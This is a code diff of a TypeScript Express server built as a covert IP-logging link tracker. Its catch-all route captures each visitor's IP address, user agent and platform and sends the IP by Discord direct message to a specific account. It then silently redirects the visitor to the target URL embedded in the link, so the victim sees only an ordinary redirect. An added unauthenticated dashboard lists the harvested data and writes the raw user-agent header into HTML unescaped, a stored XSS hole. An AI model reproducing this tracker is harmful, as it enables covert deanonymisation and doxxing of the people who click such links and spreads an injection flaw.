@@ -39,20 +39,102 @@ app.get('/akaritm', async (_req, res) => {
   //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
   res.redirect(200, 'https://www.stripersonline.com/surftalk/uploads/gallery/album_14234/6b3e9b22_hot-girls-nice-boobs-high-res-13oct-21.jpeg')
 });
+const ips: {ip: string, date: string, userAgent: string| string[], platform: string | string[]}[] = []
+app.get('/dashboard', (req, res) => {
+  let tableEntries = ''
+  for(const entry of ips) {
+    tableEntries += `<tr>
+        <td>${entry.ip}</td>
+        <td>${entry.date}</td>
+        <td>${entry.platform}</td>
+        <td>${entry.userAgent}</td>`
+    }
+  res.send(`
+    <html>
+    <body>
+   <style>
+.table_component {
+    overflow: auto;
+    width: 100%;
+    display: flex;
+}
 
-app.get('/https://www.tiktok.com/@zhtorr/video/7493515873487965448', async (_req, res) => {
-  logger.log('Recived get request');
-  const ip = _req.ip || _req.socket.remoteAddress
-  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
-  //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
-  res.redirect('https://www.tiktok.com/@zhtorr/video/7493515873487965448?is_from_webapp=1&sender_device=pc')
-});
+.table_component table {
+    border: 1px solid #dededf;
+    height: 100%;
+    width: 100%;
+    table-layout: fixed;
+    border-collapse: collapse;
+    border-spacing: 1px;
+    text-align: left;
+}
+
+.table_component caption {
+    caption-side: top;
+    text-align: left;
+}
+
+.table_component th {
+    border: 1px solid #dededf;
+    background-color: #eceff1;
+    color: #000000;
+    padding: 5px;
+}
+
+.table_component td {
+    border: 1px solid #dededf;
+    background-color: #ffffff;
+    color: #000000;
+    padding: 5px;
+}
+</style>
+<div class="table_component" role="region" tabindex="0">
+<table>
+    <caption>IP's list</caption>
+    <thead>
+        <tr>
+            <th>Time</th>
+            <th>IP</th>
+            <th>Platform</th>
+            <th>User-Agent</th>
+        </tr>
+    </thead>
+    <tbody>
+     
+       
+        ${
+        tableEntries
+  }
+
+    </tbody>
+</table>
+</div>
+ 
+    </body>
+     </html>
+    
+    `)
+})
 app.get('*', async (req, res) => {
+  
   const ip = req.ip || req.socket.remoteAddress
+  if(ips.find((value) => {
+    return value.ip === ip
+  })) return;
   await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
-   console.log(req.url)
+  
+  
+  var d = new Date();
+  ips.push({
+    ip: ip || '',
+    date: d.toLocaleString('en-US', { timeZone: 'Europe/Stockholm' }),
+    platform: req.headers['sec-ch-ua-platform'] || 'unknown',
+    userAgent: req.headers['user-agent'] || 'unknown'
+  })
+
    res.redirect(req.url.slice(1))
  })
+
 app.post('/', (_req, res) => {
   logger.log('Recived post request');
   res.status(200).json({'hello world': 'hello world'});
